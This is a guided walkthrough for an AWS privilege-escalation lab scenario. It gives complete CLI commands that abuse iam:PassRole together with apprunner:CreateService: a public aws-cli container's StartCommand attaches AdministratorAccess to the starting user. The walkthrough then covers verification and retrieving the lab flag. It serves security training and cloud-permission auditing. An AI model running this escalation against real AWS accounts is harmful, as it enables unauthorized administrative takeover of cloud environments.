# Guided Walkthrough: Privilege Escalation via iam:PassRole + apprunner:CreateService

This scenario demonstrates a privilege escalation vulnerability where a user with `apprunner:CreateService` and `iam:PassRole` permissions can create an AWS App Runner service that executes arbitrary commands with a privileged role's permissions. The attacker passes an administrative role to the App Runner service and uses the `StartCommand` override feature to execute AWS CLI commands that grant themselves administrator access.

App Runner is AWS's fully managed container application service that automatically builds and deploys web applications from source code or container images. When creating an App Runner service, you can specify an instance role that grants permissions to the running application. The `ImageConfiguration` parameter allows overriding the container's default startup command, providing an execution vector for privilege escalation.

This attack is particularly dangerous because it combines the flexibility of containerized execution with the power of IAM role assumption, all while using a public ECR image that requires no custom code or infrastructure. The public AWS CLI container (`public.ecr.aws/aws-cli/aws-cli:latest`) has its entrypoint set to `/usr/local/bin/aws`, which means any `StartCommand` provided to App Runner is interpreted as arguments to the AWS CLI. The privilege escalation happens immediately when the container starts — the service doesn't need to pass health checks or stay running for the attack to succeed.

## The Challenge

You start as the IAM user `pl-prod-apprunner-001-to-admin-starting-user`. Your credentials are available via Terraform outputs. This user has `apprunner:CreateService`, `iam:PassRole` (scoped to `pl-prod-apprunner-001-to-admin-target-role`), and `iam:CreateServiceLinkedRole` permissions.

Your goal is to gain the permissions of `pl-prod-apprunner-001-to-admin-target-role`, which has `iam:AttachUserPolicy` and is trusted by `tasks.apprunner.amazonaws.com`. By getting that role to attach `AdministratorAccess` to your starting user, you achieve full administrative access.

## Reconnaissance

First, confirm who you are and what you can't do yet:

```bash
# Set up your starting credentials from Terraform outputs
cd <project-root>
MODULE_OUTPUT=$(terraform output -json | jq -r '.single_account_privesc_one_hop_to_admin_apprunner_001_iam_passrole_apprunner_createservice.value')
export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
unset AWS_SESSION_TOKEN

# Verify identity
aws sts get-caller-identity --query 'Arn' --output text
# -> arn:aws:iam::<account_id>:user/pl-prod-apprunner-001-to-admin-starting-user

# Confirm no admin access yet
aws iam list-users --max-items 1
# -> AccessDenied
```

Next, grab the account ID — you'll need it to build the target role ARN:

```bash
aws sts get-caller-identity --query 'Account' --output text
# -> <account_id>
```

## Exploitation

With the account ID in hand, build the service configuration. The key insight is that the `public.ecr.aws/aws-cli/aws-cli:latest` container's entrypoint is `/usr/local/bin/aws`. Any `StartCommand` you provide is passed directly as arguments to that entrypoint, so you can run any AWS CLI command as the instance role without needing shell access.

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-apprunner-001-to-admin-target-role"
STARTING_USER="pl-prod-apprunner-001-to-admin-starting-user"

# Create the App Runner service - this is the exploit
aws apprunner create-service \
  --service-name pl-privesc-apprunner-demo \
  --source-configuration "{
    \"ImageRepository\": {
      \"ImageIdentifier\": \"public.ecr.aws/aws-cli/aws-cli:latest\",
      \"ImageRepositoryType\": \"ECR_PUBLIC\",
      \"ImageConfiguration\": {
        \"Port\": \"8080\",
        \"StartCommand\": \"iam attach-user-policy --user-name ${STARTING_USER} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"
      }
    },
    \"AutoDeploymentsEnabled\": false
  }" \
  --instance-configuration "{
    \"Cpu\": \"1 vCPU\",
    \"Memory\": \"2 GB\",
    \"InstanceRoleArn\": \"${TARGET_ROLE_ARN}\"
  }"
```

App Runner now pulls the container image, starts the service, and executes the `StartCommand` using the instance role's credentials. The `iam attach-user-policy` command runs as `pl-prod-apprunner-001-to-admin-target-role`, which has permission to attach policies. This typically takes 3-5 minutes.

Poll the service status while you wait:

```bash
SERVICE_ARN=$(aws apprunner list-services --query "ServiceSummaryList[?ServiceName=='pl-privesc-apprunner-demo'].ServiceArn" --output text)

aws apprunner describe-service \
  --service-arn "$SERVICE_ARN" \
  --query 'Service.Status' \
  --output text
# -> OPERATION_IN_PROGRESS ... RUNNING
```

## Verification

Once the service reaches `RUNNING` state, wait an additional 15 seconds for IAM policy propagation, then verify:

```bash
sleep 15

# Check the policy was attached
aws iam list-attached-user-policies \
  --user-name pl-prod-apprunner-001-to-admin-starting-user
# -> AdministratorAccess should appear in the list

# Confirm admin access with your original credentials
aws iam list-users
# -> Full list of IAM users — you now have admin access
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/apprunner-001-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited the fact that `iam:PassRole` + a compute service creation permission creates a covert execution path. Instead of assuming the privileged role yourself (which would require `sts:AssumeRole`), you delegated execution to a managed service. App Runner started the container using the instance role's credentials, and your embedded `StartCommand` ran as that role — attaching `AdministratorAccess` to your user without ever directly assuming the role.

This pattern generalizes broadly. Any AWS service that accepts an instance/execution role and allows command or code override at creation time (Lambda, ECS, EC2 user data, CodeBuild, Glue, SageMaker, CloudFormation, etc.) can serve as this execution proxy. The minimal AWS-managed public ECR image makes the attack particularly clean since it requires no custom container build or external infrastructure.
